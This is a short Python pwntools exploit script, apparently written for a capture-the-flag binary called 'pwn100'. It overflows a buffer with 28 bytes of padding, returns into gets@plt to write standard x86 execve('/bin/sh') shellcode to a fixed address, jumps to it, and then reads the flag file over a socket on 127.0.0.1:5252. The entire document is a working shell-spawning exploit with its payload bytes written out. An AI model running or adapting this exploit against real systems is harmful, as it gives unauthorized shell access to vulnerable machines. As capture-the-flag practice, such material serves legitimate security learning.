#TnMch
from pwn import *

context(arch='i386',os='linux')

local = False
#local = False

if local: p = process("./pwn100")
else: p = remote("127.0.0.1", 5252)

binary = ELF("./pwn100")
payload = "A"*28
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shelladd = 0x804a020
gets_plt = 0x80482f0

payload = payload
payload +=p32(gets_plt)
payload +=p32(shelladd) 
payload +=p32(shelladd)
p.send(payload+'\n')
p.send(shellcode+'\n')
p.send("cat /home/pwn100/flag"+'\n')
print p.recv()
